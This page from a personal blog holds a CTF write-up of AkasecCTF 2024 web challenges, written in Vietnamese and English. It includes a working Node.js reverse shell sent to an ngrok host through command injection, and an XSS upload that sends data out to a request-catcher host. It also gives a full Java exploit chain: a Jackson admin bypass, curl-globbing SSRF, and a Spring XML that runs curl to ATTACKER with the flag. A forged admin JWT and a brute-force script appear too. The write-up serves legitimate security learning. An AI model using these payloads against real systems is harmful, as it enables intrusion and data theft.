@@ -1,0 +1,697 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>AkasecCTF web chall ctf 2024 - solved challenges - Zoltán&#39;s Blog</title>
+  <meta name="description" content="Hacker Community Flag: AKASEC{__W3lc0me_t0_HackerC0mmun1tyy__}
+Rusty Road poc:
+# import requests## register_url = &quot;http://172.206.89.197:9080/register&quot;# login_url = &quot;http://172.206.89.197:9080/login&quot;# alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^&amp;*()_&#43;-=,./&lt;&gt;?:&quot;# username = &quot;lamdepchaiii&quot;# PASSWORD = &quot;M07H4F7H38167Hr33175JU57816M3&quot;# index = 71# loop = 1## while True:# data_reg = {# &quot;username&quot;: username &#43; &quot;a&quot; * loop,# &quot;password&quot;: &quot;a&quot; * index &#43; &quot;PASSWORD&quot;# }## register_response = requests.post(register_url, data=data_reg)# if &quot;Hello&quot; in register_response.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-06-13-akasecctf2024-web-chall\/",
+          "name": "Akasec ctf web chall ctf 2024 solved challenges"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "AkasecCTF web chall ctf 2024 - solved challenges",
+  "description" : "Hacker Community Flag: AKASEC{__W3lc0me_t0_HackerC0mmun1tyy__}\nRusty Road poc:\n# import requests\r#\r# register_url = \u0026quot;http:\/\/172.206.89.197:9080\/register\u0026quot;\r# login_url = \u0026quot;http:\/\/172.206.89.197:9080\/login\u0026quot;\r# alphabet = \u0026quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^\u0026amp;*()_\u002b-=,.\/\u0026lt;\u0026gt;?:\u0026quot;\r# username = \u0026quot;lamdepchaiii\u0026quot;\r# PASSWORD = \u0026quot;M07H4F7H38167Hr33175JU57816M3\u0026quot;\r# index = 71\r# loop = 1\r#\r# while True:\r# data_reg = {\r# \u0026quot;username\u0026quot;: username \u002b \u0026quot;a\u0026quot; * loop,\r# \u0026quot;password\u0026quot;: \u0026quot;a\u0026quot; * index \u002b \u0026quot;PASSWORD\u0026quot;\r# }\r#\r# register_response = requests.post(register_url, data=data_reg)\r# if \u0026quot;Hello\u0026quot; in register_response.",
+  "inLanguage" : "en",
+  "wordCount":  1277 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-06-13-akasecctf2024-web-chall\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="AkasecCTF web chall ctf 2024 - solved challenges" />
+<meta property="og:description" content="Hacker Community Flag: AKASEC{__W3lc0me_t0_HackerC0mmun1tyy__}
+Rusty Road poc:
+# import requests## register_url = &quot;http://172.206.89.197:9080/register&quot;# login_url = &quot;http://172.206.89.197:9080/login&quot;# alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^&amp;*()_&#43;-=,./&lt;&gt;?:&quot;# username = &quot;lamdepchaiii&quot;# PASSWORD = &quot;M07H4F7H38167Hr33175JU57816M3&quot;# index = 71# loop = 1## while True:# data_reg = {# &quot;username&quot;: username &#43; &quot;a&quot; * loop,# &quot;password&quot;: &quot;a&quot; * index &#43; &quot;PASSWORD&quot;# }## register_response = requests.post(register_url, data=data_reg)# if &quot;Hello&quot; in register_response.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-06-13-akasecctf2024-web-chall/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="AkasecCTF web chall ctf 2024 - solved challenges" />
+  <meta name="twitter:description" content="Hacker Community Flag: AKASEC{__W3lc0me_t0_HackerC0mmun1tyy__}
+Rusty Road poc:
+# import requests## register_url = &quot;http://172.206.89.197:9080/register&quot;# login_url = …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>AkasecCTF web chall ctf 2024 - solved challenges</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h2 id="hacker-community">Hacker Community</h2>
+<p><img src="https://hackmd.io/_uploads/HkRTtSDrA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BJUqpxXr0.png" alt="image"></p>
+<p>Flag: <code>AKASEC{__W3lc0me_t0_HackerC0mmun1tyy__}</code></p>
+<h2 id="rusty-road">Rusty Road</h2>
+<p><img src="https://hackmd.io/_uploads/B1OEFSPH0.png" alt="image"></p>
+<p>poc:</p>
+<pre><code># import requests
+#
+# register_url = &quot;http://172.206.89.197:9080/register&quot;
+# login_url = &quot;http://172.206.89.197:9080/login&quot;
+# alphabet = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^&amp;*()_+-=,./&lt;&gt;?:&quot;
+# username = &quot;lamdepchaiii&quot;
+# PASSWORD = &quot;M07H4F7H38167Hr33175JU57816M3&quot;
+# index = 71
+# loop = 1
+#
+# while True:
+#     data_reg = {
+#         &quot;username&quot;: username + &quot;a&quot; * loop,
+#         &quot;password&quot;: &quot;a&quot; * index + &quot;PASSWORD&quot;
+#     }
+#
+#     register_response = requests.post(register_url, data=data_reg)
+#     if &quot;Hello&quot; in register_response.text:
+#         print(&quot;Đăng ký thành công.&quot;)
+#     else:
+#         print(f&quot;Đăng ký thất bại với mã trạng thái: {register_response.status_code}&quot;)
+#
+#     for char in alphabet:
+#         data_log = {
+#             &quot;username&quot;: username + &quot;a&quot; * loop,
+#             &quot;password&quot;: &quot;a&quot; * index + PASSWORD + char
+#         }
+#         login_response = requests.post(login_url, data=data_log)
+#
+#         if &quot;Hello&quot; in login_response.text:
+#             print(&quot;Đăng nhập thành công!&quot;)
+#             PASSWORD += char
+#             print(PASSWORD)
+#             index -= 1
+#             loop += 1
+#             break
+
+import requests
+import json
+
+log_url = &quot;http://172.206.89.197:9080/log&quot;
+
+log_data = {&quot;message&quot;: &quot;&amp;&amp; echo '(function(){var net = require(\&quot;net\&quot;), cp = require(\&quot;child_process\&quot;), sh = cp.spawn(\&quot;/bin/sh\&quot;, []); var client = new net.Socket(); client.connect(16682, \&quot;0.tcp.ap.ngrok.io\&quot;, function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();' &gt; rev.js | bun run rev.js&quot;}
+
+headers = {
+    &quot;Cookie&quot;: &quot;token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl90eXBlIjoiYWRtaW4iLCJleHAiOjEwMDAwMDAwMDAwfQ.MG6gg_c7eZ-aMS2cIs-SasS8w9Ixvkzi2v_-fS7KfOo&quot;,
+    &quot;Content-Type&quot;: &quot;application/json&quot;
+}
+
+response = requests.post(log_url, headers=headers, data= json.dumps(log_data))
+
+print(response.text)
+
+</code></pre><p><img src="https://hackmd.io/_uploads/SkkgV2ErA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BJlyNn4HR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HyMWU3EH0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/rkCm_nNS0.png" alt="image"></p>
+<pre><code>POST /log HTTP/1.1
+Host: 172.206.89.197:9080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl90eXBlIjoiYWRtaW4iLCJleHAiOjEwMDAwMDAwMDAwfQ.MG6gg_c7eZ-aMS2cIs-SasS8w9Ixvkzi2v_-fS7KfOo
+Content-Type: application/json
+Upgrade-Insecure-Requests: 1
+Priority: u=1
+
+{&quot;message&quot;:
+  { &quot;raw&quot;:&quot;l3mnt2010 &amp;&amp; echo KGZ1bmN0aW9uKCl7CiAgICB2YXIgbmV0ID0gcmVxdWlyZSgibmV0IiksCiAgICAgICAgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksCiAgICAgICAgc2ggPSBjcC5zcGF3bigiL2Jpbi9zaCIsIFtdKTsKICAgIHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwogICAgY2xpZW50LmNvbm5lY3QoMTYwODQsICIwLnRjcC5hcC5uZ3Jvay5pbyIsIGZ1bmN0aW9uKCl7CiAgICAgICAgY2xpZW50LnBpcGUoc2guc3RkaW4pOwogICAgICAgIHNoLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICAgICAgc2guc3RkZXJyLnBpcGUoY2xpZW50KTsKICAgIH0pOwogICAgcmV0dXJuIC9hLzsKfSkoKTs= | base64 -d | bun run -&quot;
+  }
+}
+</code></pre><p><img src="https://hackmd.io/_uploads/rJC7LrDH0.png" alt="image"></p>
+<p>Flag : <code>AKASEC{w311_17_41n7_7h47_2u57yyy_4f732_411}</code></p>
+<h2 id="upload">Upload</h2>
+<p><img src="https://hackmd.io/_uploads/B1LlcBwHR.png" alt="image"></p>
+<ul>
+<li>Khi vào views nó sẽ không mở file của nó luôn mà phải truy cập vào uploads/your-file.html để kích hoạt html</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/r1xQrsBB0.png" alt="image"></p>
+<pre><code>POST /upload HTTP/1.1
+Host: 172.206.89.197:9000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------140731221425871396061686687964
+Content-Length: 354
+Origin: http://172.206.89.197:9000
+Connection: close
+Referer: http://172.206.89.197:9000/upload
+Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl90eXBlIjoiYWRtaW4iLCJleHAiOjEwMDAwMDAwMDAwfQ.MG6gg_c7eZ-aMS2cIs-SasS8w9Ixvkzi2v_-fS7KfOo; connect.sid=s%3A6uYUS3A21Lg0Xyq2MJICGe8I6_5nI7Vk.ZJeBUta0K%2FT9OMLM6QcpaC%2BVngOX2napDlFnrKxU43Q
+Upgrade-Insecure-Requests: 1
+Priority: u=1
+
+-----------------------------140731221425871396061686687964
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;p.html&quot;
+Content-Type: application/pdf
+
+&lt;script&gt;fetch('/flag').then(e=&gt;e.text()).then(e=&gt;{fetch('http://wuzz9syo.requestrepo.com', { method : 'post', body: e })})&lt;/script&gt;
+-----------------------------140731221425871396061686687964--
+
+</code></pre><p>Flag : <code>AKASEC{PDF_1s_4w3s0m3_W1th_XSS_&amp;&amp;_Fr33_P4le5T1n3_r0t4t333d_loooool}</code></p>
+<ul>
+<li>solution intended của chall này là CVE của file pdf từ việc chúng ta có thể khai thác XSS thông qua file pdf.</li>
+</ul>
+<h2 id="hacker-nickname">Hacker NickName</h2>
+<ul>
+<li>
+<p>Một chall white-box với java spring + Anotation Jackson + curl global + deserialize java</p>
+</li>
+<li>
+<p>Bày này mình đã detect được các chain và dẫn đến deserialize nhưng mà khả năng bypass còn kém nên vẫn phải nhờ đến sự trợ giúp của các anh.</p>
+</li>
+<li>
+<p>Chall này là chain của 3 lỗ hổng là jackson anotation bypass admin + curl global to bypass java.net.URL check host + check protocol + check port + CVE deserialize của java hướng đến RCE đọc /readflag</p>
+</li>
+<li>
+<p>Trang web có chức năng đơn gian là nhập têm và sở thích sau đó thì hiển thị hacker nickname</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/S12S4UDHA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1o8NUwSA.png" alt="image"></p>
+<ul>
+<li>
+<p>Vì là source white-box java nên mình sẽ đi vào phân tích luôn nhé.</p>
+</li>
+<li>
+<p>Đầu tiên sẽ tìm những nơi có thể RCE được flag bởi vì để đọc flag cần phải gọi /readflag, sau một hồi lật lại giữa các route thì mình thấy một chain có khả năng dính deserialize của java:</p>
+</li>
+</ul>
+<pre><code>@RequestMapping(&quot;/ExperimentalSerializer&quot;)
+public class ExperimentalSerializerController {
+
+    @GetMapping
+    public String experimentalSerializer(@RequestParam(value = &quot;serialized&quot;, required = false) String serialized, HttpServletRequest request, Model model) {
+        if (!request.getRemoteAddr().equals(&quot;127.0.0.1&quot;))
+            return &quot;redirect:/&quot;;
+        if (serialized != null)
+        {
+            HashMap&lt;String, Object&gt; result = ExperimentalSerializer.deserialize(serialized);
+            model.addAttribute(&quot;result&quot;, result.toString());
+        }
+        return &quot;serializer&quot;;
+    }
+}
+</code></pre><ul>
+<li>Nó sẽ nhận một parameter serialized sau đó check nếu mà người dùng from 127.0.0.1 tức là localhost thì sẽ gọi đến method <code>deserialize</code> của <code>ExperimentalSerializer</code></li>
+<li>Và anh null001 đã tìm ra được CVE của nó là <code>CVE-2017-17485</code> mình sẽ phân tích nó sau.</li>
+<li>Bây giờ thì đã tìm được nơi chứa vul rồi, tiếp theo tìm hook để access đến nó mình tiếp tục tìm được một route khả nghi sẽ gọi curl rất thuận lợi để bypass localhost:</li>
+</ul>
+<pre><code>@PostMapping(&quot;/update&quot;)
+    public ResponseEntity&lt;String&gt; post(@RequestParam(&quot;url&quot;) String url, HttpServletRequest request) throws NullPointerException, IOException, InterruptedException {
+        if (!isAdmin(request.getCookies()))
+            return ResponseEntity.status(401).body(&quot;You are not an admin.&quot;);
+        URL parsedUrl;
+        try {
+            parsedUrl = new URL(url);
+        } catch (MalformedURLException e) {
+            return ResponseEntity.status(401).body(e.getMessage());
+        }
+        if (!parsedUrl.getProtocol().equals(&quot;http&quot;) || !parsedUrl.getHost().equals(&quot;nicknameservice&quot;) || parsedUrl.getPort() != 5000)
+            return ResponseEntity.status(401).body(&quot;Invalid URL&quot;);
+        ProcessBuilder pb = new ProcessBuilder(&quot;curl&quot;, &quot;-f&quot;, url, &quot;-o&quot;, nicknameService.filePath.toString());
+        Process p = pb.start();
+        p.waitFor();
+        //System.out.println(new String(p.getErrorStream().readAllBytes(), StandardCharsets.UTF_8));
+        nicknameService.reload();
+        return ResponseEntity.ok(&quot;updated.&quot;);
+    }
+</code></pre><ul>
+<li>Nhưng vấn đề cần giải quyết thứ nhất ở đây là server sẽ check role admin của mình trước khi có thể thực hiện curl.</li>
+<li>Vậy tên ta sẽ quay trở lại flow chính của chương trình đó chính là nhập tên và chọn favorite sau đó hiển thị hacker nickname:</li>
+</ul>
+<pre><code> @PostMapping(consumes=&quot;application/json&quot;)
+    public void post(@RequestBody @Valid Hacker hacker, HttpServletResponse response) {
+        hacker.setNickName(nicknameService.getNickName());
+        String token = jwtUtil.generateToken(hacker.getInfo());
+        Cookie cookie = new Cookie(&quot;jwt&quot;, token);
+        cookie.setHttpOnly(true);
+        cookie.setPath(&quot;/&quot;);
+        response.addCookie(cookie);
+    }
+</code></pre><ul>
+<li>Đây là /route thực hiện điều đó sau đó ta có thể thấy nó generate jwt mới với thông tin của hacker theo class:</li>
+</ul>
+<pre><code>public class Hacker {
+    @NotBlank
+    private final String firstName;
+    @NotBlank
+    private final String lastName;
+    @NotBlank
+    private final String favouriteCategory;
+    private final UserRole role;
+    private String nickName;
+
+    @JsonCreator
+    public Hacker(@JsonProperty(value = &quot;firstName&quot;, required = true) String firstName,
+                  @JsonProperty(value = &quot;lastName&quot;, required = true) String lastName,
+                  @JsonProperty(value = &quot;favouriteCategory&quot;, required = true) String favouriteCategory,
+                  @JacksonInject UserRole hackerRole) {
+        this.firstName = firstName;
+        this.lastName = lastName;
+        this.favouriteCategory = favouriteCategory;
+        this.role = hackerRole;
+    }
+
+    public Boolean isAdmin() {
+        return (role.admin);
+    }
+
+    public void setNickName(String nickName) {
+        this.nickName = nickName;
+    }
+
+    public Map&lt;String, Object&gt; getInfo() {
+        Map&lt;String, Object&gt; hackerInfo = new HashMap&lt;&gt;();
+        hackerInfo.put(&quot;nickname&quot;, nickName);
+        hackerInfo.put(&quot;admin&quot;, isAdmin());
+        return hackerInfo;
+    }
+}
+
+</code></pre><ul>
+<li>Có thể thấy <code>@JacksonInject</code> sẽ control hackerRole của chúng ta sau đó nó set role mặc định là false tức là không phải admin -&gt; chúng ta sẽ bypass admin bằng cách sử dụng lỗ hổng của <code>Jackson</code> anotation, và đây là cách bypass nó:</li>
+</ul>
+<pre><code>{&quot;firstName&quot;:&quot;123&quot;,&quot;lastName&quot;:&quot;123&quot;,&quot;favouriteCategory&quot;:&quot;123&quot;,
+&quot;&quot;:{&quot;admin&quot;:true}
+}
+</code></pre><ul>
+<li>Tiếp theo quay trở lại với <code>/update</code> nó sẽ nhận giá trị url và áp vào class URL của java.net.URL -&gt; check :</li>
+</ul>
+<pre><code> if (!parsedUrl.getProtocol().equals(&quot;http&quot;) || !parsedUrl.getHost().equals(&quot;nicknameservice&quot;) || parsedUrl.getPort() != 5000)
+            return ResponseEntity.status(401).body(&quot;Invalid URL&quot;);
+</code></pre><ul>
+<li>Nếu protocol khác http host khác <code>nicknameservice</code> và port khác <code>5000</code> ngay lúc này mình nghĩ đến việc bypass bằng <code>@</code> nhưng mà nó chỉ hiện thực với python còn java này ta sẽ sử dụng tính năng globbing curl của curl:</li>
+<li>Có một vài các cách curl nhiều domain được curl giới thiệu:
+<img src="https://hackmd.io/_uploads/HyekWDDSR.png" alt="image"></li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HyfbZvPS0.png" alt="image"></p>
+<ul>
+<li>Vậy là bypass được waf này với payload : <code>/admin/update?url=http://{@nicknameservice:5000/,localhost:8090/}ExperimentalSerializer?serialized=</code></li>
+</ul>
+<h3 id="phân-tích-lỗ-hổng-cve-2021-25646-jackson">Phân tích lỗ hổng CVE-2021-25646 Jackson:</h3>
+<p><a href="https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/</a></p>
+<h3 id="phân-tích-cve-2017-17485-java-deserialize-to-rce">Phân tích CVE-2017-17485 java deserialize to RCE</h3>
+<p><a href="https://www.cnblogs.com/afanti/p/10203282.html">https://www.cnblogs.com/afanti/p/10203282.html</a></p>
+<p>POC :</p>
+<pre><code>    1) Set JWT to admin=true.
+        - https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/
+    2) Curl globbing
+        - https://everything.curl.dev/cmdline/globbing.html
+    3) Class Instantiation
+        - https://samuzora.com/posts/rwctf-2024/
+</code></pre><pre><code>import httpx
+from urllib.parse import quote
+
+
+URL = &quot;http://172.206.89.197:8090/&quot;
+#URL = &quot;http://localhost:8090/&quot;
+ATTACKER = &quot;https://ATTACKER/pov.xml&quot;
+</code></pre><pre><code> pov.xml 
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
+&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+        xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+        xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans
+        http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;
+&lt;bean class=&quot;#{T(java.lang.Runtime).getRuntime().exec(
+        new String[] {
+        '/bin/bash', '-c', 'curl https://ATTACKER/?flag=$(/readflag|base64)'
+        }
+        )}&quot;&gt;&lt;/bean&gt;
+&lt;/beans&gt;
+</code></pre><h1 id="set-jwt-admin-true-cookie">Set JWT admin true cookie</h1>
+<h1 id="ref-httpsblogkuron3k0vip20210410vulns-of-misunderstanding-annotation">Ref: <a href="https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/</a></h1>
+<pre><code>def get_admin_jwt(client):
+    payload = {
+        &quot;firstName&quot;: &quot;marce&quot;,
+        &quot;lastName&quot;: &quot;loves&quot;,
+        &quot;favouriteCategory&quot;: &quot;p4rra&quot;,
+        &quot;&quot;: {&quot;admin&quot;: True}
+    }
+    r = client.post(URL, json=payload)
+    print(f&quot;[*] jwt: {r.cookies['jwt']}\n&quot;)
+    assert &quot;&quot; != r.cookies['jwt']
+
+
+# /admin update
+def deserialization(client):
+    build = '[{&quot;type&quot;:&quot;object&quot;,&quot;name&quot;:&quot;TypeReference&quot;,&quot;value&quot;:&quot;org.springframework.context.support.FileSystemXmlApplicationContext|' + ATTACKER + '&quot;}]'
+    payload = {'url': &quot;http://{127.0.0.1:8090,@nicknameservice:5000/}/ExperimentalSerializer?serialized=&quot;+quote(build)}
+    r = client.post(URL+'admin/update', data=payload)
+    print(r.text)
+
+
+client = httpx.Client()
+get_admin_jwt(client)
+deserialization(client)
+</code></pre><p>link : <a href="https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/</a>
+link curl global : <a href="https://curl.se/docs/manpage.html">https://curl.se/docs/manpage.html</a>
+link cve : <a href="https://www.cnblogs.com/afanti/p/10203282.html">https://www.cnblogs.com/afanti/p/10203282.html</a></p>
+<h2 id="proxy-for-life">Proxy for life</h2>
+<p><img src="https://hackmd.io/_uploads/B1x3KBwBA.png" alt="image"></p>
+<ul>
+<li>Chall white-box with go server</li>
+</ul>
+<p>poc :</p>
+<pre><code>const express = require('express')
+const app = express()
+const port = 3000
+
+let switchFlag = 0;
+
+app.get('/', (req, res) =&gt; {
+    if (switchFlag == 0) {
+        res.send('Hello World!');
+        switchFlag = 1;
+    } else {
+        res.redirect('http://localhost:1337/debug/pprof/cmdline');
+        switchFlag = 0;
+    }
+});
+
+app.listen(port, () =&gt; {
+  console.log(`Example app listening on port ${port}`)
+</code></pre><ul>
+<li>document for result : <a href="https://pkg.go.dev/net/http/pprof">https://pkg.go.dev/net/http/pprof</a></li>
+</ul>
+<p>flag : <code>AKASEC{r0t4t3d_p20x1n9_f002_11f3_15n7_92347_4f732_411____}</code></p>
+<h2 id="miscpyjail">Misc/Pyjail</h2>
+<p><a href="https://capitalizemytitle.com/gothic-font-generator/">https://capitalizemytitle.com/gothic-font-generator/</a></p>
+<p><img src="https://hackmd.io/_uploads/B1zpXX8HC.png" alt="image"></p>
+
+
+        
+          <div class="blog-tags">
+            
+              
